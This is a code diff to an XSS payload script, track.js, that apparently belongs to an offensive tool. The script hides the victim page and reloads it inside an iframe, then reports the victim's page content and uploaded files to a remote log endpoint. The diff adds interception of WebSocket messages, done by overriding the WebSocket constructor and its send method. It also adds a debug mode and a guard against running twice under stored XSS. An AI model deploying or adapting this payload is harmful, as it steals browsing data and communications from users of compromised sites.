@@ -21,8 +21,18 @@
  * site - site id (optional) - used to enable logs from different sites simultaneously
  * observe - jQuery selector to look for in pages. If it's present, it's HTML content will be logged
  * files - if set, will also try to capture files uploaded to victim site (requires XMLHttpRequest Level 2 support)
+ * websocket - if set, will also try to dump communications over WebSockets
+ * debug - if set, events will be logged to a console, instead of reported to 'log'
  */
 (function() {
+
+	try {
+		if (window.parent && window.parent.document.getElementById('_track')) {
+			// we already are in xss-track iframe (stored xss), abort
+			return;
+		}
+	} catch(e) {}
+
 	function parseQuery (query) {
 		   var Params = {};
 		   if (!query) { return Params; } // return empty object
@@ -48,8 +58,14 @@
 	var logUrl = params.log || scriptUrl.replace(/\/track.js/, '/log.php');
 	var observeSelector = params.observe || null;
 	var captureFiles = params.files || null;
+	var captureWebsocket = params.websocket || null;
 
 	function log(what) {
+		if (params.debug) {
+			console.log(what);
+			return;
+		}
+
 		what._ = Math.random(); // avoid caching
 		if (params.site) {
 			what.site = params.site;
@@ -81,7 +97,7 @@
 	var init = function() {
 		$('body').children().hide();
 
-		var i = $('<iframe>')
+		var i = $('<iframe id=_track>')
 			.css({
 				position: 'absolute',
 				width: '100%',
@@ -182,6 +198,49 @@
 
 					// would do it with live('change'), but FF 4.0 beta 7 seems to ignore this
 					$('input[type=file]',this.contentDocument).change(doCaptureFiles);
+				}
+
+				if (captureWebsocket && window.WebSocket) {
+
+					// add logging onmessage listener
+					function captureRecv(ws) {
+						if (typeof ws.captured == 'undefined') {
+							ws.addEventListener('message', function(e) {
+								var event = {
+										event: 'websocket_recv',
+										from: location,
+										data: e.data,
+										url: e.target.URL
+								}
+								log(event);
+							});
+							ws.captured = true;
+						}
+					}
+
+					// capture sending
+					var captureSend = this.contentWindow.WebSocket.prototype.send = function() {
+						captureRecv(this); // in case socket contruction was before constructor switching
+						var event = {
+								event: 'websocket_send',
+								from: location,
+								data: arguments[0],
+								url: this.URL
+						};
+
+						log(event);
+						return window.WebSocket.prototype.send.apply(this, arguments);
+					}
+
+					// capture constructor
+					this.contentWindow.WebSocket = function(a,b) {
+						var base;
+						base = (typeof b !== "undefined") ? new WebSocket(a,b) : new WebSocket(a);
+						captureRecv(base);
+						base.send = captureSend;
+						this.__proto__ = WebSocket.constructor;
+						return base;
+					}
 				}
 			});
 
